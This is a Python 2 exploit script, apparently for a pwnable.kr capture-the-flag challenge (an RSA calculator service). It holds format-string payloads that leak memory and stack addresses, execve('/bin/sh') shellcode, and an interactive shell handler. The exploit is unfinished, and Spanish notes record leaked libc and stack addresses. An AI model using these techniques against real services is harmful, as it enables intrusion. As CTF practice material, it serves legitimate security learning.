#! /usr/bin/env python2
# -*- coding: utf-8 -*-

import socket
import telnetlib
import struct

p64 = lambda data: struct.pack("Q", data)
u64 = lambda data: struct.unpack("Q", data)[0]
p32 = lambda data: struct.pack("I", data)
u32 = lambda data: struct.unpack("I", data)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(60)
host = 'pwnable.kr'
host = '0'
s.connect((host, 9012))

shellcode = "\x31\xC0\x99\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x31\xF6\xB0\x3B\x0F\x05"
shell_encrypted = "fb2300006c3e0000882b0000c71f0000ab170000e72c0000341f0000cd2800007c39000042050000c1190000a3090000210c0000c71f0000183f0000202e0000621d0000f32a00000d150000fb23000035220000e83c000013320000013a0000320f0000"

def recvall():
    out = ""
    while True:
        try:
            out += s.recv(1)
        except socket.timeout:
            return out

def recvline(keepends=True):
    return recvuntil('\n', keepends)

def recvlines(numlines, keepends=False):
    b = ""
    for i in xrange(numlines):
        b += recvline(keepends)
    return b

def recv(n=4096):
    b = ""
    while len(b) < n:
        b += s.recv(n - len(b))
    return b

def recvuntil(check, keepends=True):
    b = ""
    while check not in b:
        b += s.recv(1)
    if keepends is False:
        b = b[:-len(check)]
    return b

def sendline(msg):
    s.send(msg + '\n')

def send(msg):
    s.send(msg)

def interactive():
    print 'shell:'
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def setkey():
    sendline('1')
    recvuntil('p : ')
    sendline('101')
    recvuntil('q : ')
    sendline('163')
    recvuntil('e : ')
    sendline('257')
    recvuntil('d : ')
    sendline('3593')
    recvuntil('> ')

def encrypt(pt):
    sendline('2')
    recvuntil(' : ')
    sendline(str(len(pt)))
    recvuntil('data\n')
    sendline(pt)
    recvuntil('(hex encoded) -\n')
    ct = recvline()
    recvuntil('> ')
    return ct

def decrypt(ct):
    sendline('3')
    recvuntil(' : ')
    sendline(str(len(ct)))
    recvuntil('data\n')
    sendline(ct)
    recvuntil('result -\n')
    pt = recvline()
    recvuntil('> ')
    return pt

def run(text):
    return decrypt( encrypt( text ) )

def leak_addr(addr):
    leak = run('%77$s   ' + p64(addr)).split(' ')[0]
    leak = leak + '\x00' * (8 - len(leak))
    return u64(leak)

def main():
    recvuntil('> ')
    setkey()
    # %76$p es mi input
    #print hex(leak_addr(0x00602030))
    leak = run('%6$p   ')[2:]
    stack_addr = int(leak, 16)
    print hex(stack_addr)
    ret_addr = stack_addr + 0x638
    interactive()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass

"""
sprintf 0x7f69ed936940
putchar 0x7f9457ee5290
puts    0x7f7d522c0690
fgetc   0x7fc476251030

no encontre que libc usa...
"""
leak    : 0x7fff9765cda0
ret addr :0x7fff9765d3d8
